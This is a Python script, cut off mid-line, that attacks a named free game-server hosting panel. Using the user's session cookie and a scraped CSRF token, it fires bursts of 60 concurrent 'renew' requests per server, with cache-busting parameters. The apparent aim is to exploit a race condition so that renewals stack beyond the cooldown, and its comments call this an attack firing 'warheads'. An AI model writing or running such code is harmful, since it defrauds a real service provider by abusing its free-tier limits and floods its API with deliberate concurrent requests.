import aiohttp
import asyncio
import sys
import random
import re
import os
import json

# === CONFIGURATION ===
BASE_URL = "https://gpanel.eternalzero.cloud"

# Read the cookie from GitHub Secrets
RAW_COOKIE = os.environ.get("ETERNAL_COOKIE")

if not RAW_COOKIE:
    print("[!] FATAL ERROR: ETERNAL_COOKIE environment variable is not set.")
    print("    Make sure to add it in GitHub Settings > Secrets > Actions")
    sys.exit(1)

COOKIE_STRING = f"pterodactyl_session={RAW_COOKIE}"

# Attack Settings
BURST_SIZE = 60   # Requests per server
TIMEOUT = 15

# === NETWORK HEADERS ===
def get_headers(csrf_token=None, referer=None):
    h = {
        'authority': 'gpanel.eternalzero.cloud',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'x-requested-with': 'XMLHttpRequest',
        'cookie': COOKIE_STRING,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    if csrf_token:
        h['x-csrf-token'] = csrf_token
    if referer:
        h['referer'] = referer
    return h

# === STEP 1: GET CSRF TOKEN ===
async def get_csrf_token(session):
    print("[*] Scavenging for CSRF token...")
    try:
        # We request the HTML dashboard to parse the meta tag
        async with session.get(BASE_URL, headers=get_headers()) as resp:
            if resp.status == 200:
                text = await resp.text()
                match = re.search(r'<meta name="csrf-token" content="([^"]+)">', text)
                if match:
                    token = match.group(1)
                    print(f"[+] Token Found: {token[:15]}...")
                    return token
                else:
                    print("[!] Could not find CSRF token in HTML. Cloudflare might be blocking the script.")
            elif resp.status == 401 or resp.status == 302:
                print("[!] YOUR COOKIE IS DEAD. Please login and grab a new pterodactyl_session cookie.")
                # We exit with error 1 so GitHub Actions marks the run as FAILED
                sys.exit(1)
            else:
                print(f"[!] Unexpected status fetching token: {resp.status}")
    except Exception as e:
        print(f"[!] Error fetching token: {e}")
    return None

# === STEP 2: GET SERVER LIST ===
async def get_server_list(session, csrf_token):
    print("[*] Downloading server fleet manifest...")
    servers = []
    try:
        async with session.get(f"{BASE_URL}/api/client", headers=get_headers(csrf_token)) as resp:
            if resp.status == 200:
                data = await resp.json()
                for item in data['data']:
                    attr = item['attributes']
                    servers.append({
                        'name': attr['name'],
                        'uuid': attr['uuid'],      # Long UUID (for API)
                        'short': attr['identifier'] # Short UUID (for Referer)
                    })
                print(f"[+] Found {len(servers)} servers in your fleet.")
                return servers
            else:
                print(f"[!] Failed to fetch server list. Status: {resp.status}")
    except Exception as e:
        print(f"[!] Error fetching list: {e}")
    return []

# === STEP 3: THE STORM (Per Server) ===
async def storm_server(session, server, csrf_token):
    target_url = f"{BASE_URL}/api/client/freeservers/{server['uuid']}/renew"
    print(f"\n[>>>] TARGETING: {server['name']} ({server['short']})")
    
    headers = get_headers(csrf_token, referer=f"{BASE_URL}/server/{server['short']}")
    
    tasks = []
    # Create the burst batch
    for i in range(BURST_SIZE):
        tasks.append(fire_shot(session, target_url, headers))
    
    print(f"      FIRING {BURST_SIZE} WARHEADS...")
    
    # Execute all requests simultaneously
    results = await asyncio.gather(*tasks)
    
    hits = results.count(True)
    if hits > 0:
        print(f"[$$$] {server['name']} RENEWED! (+{hits * 4} Hours)")
    else:
        print(f"[---] {server['name']} No hits (Cooldown active or blocked).")

async def fire_shot(session, url, headers):
    try:
        # ?z=random bypasses cache and forces the server to process the request
        async with session.post(url, json={}, headers=headers, params={'z': random.random()}) as resp:
            # We don't read the body to save time, just check the status code
            await resp.read()
            return resp.status in [2
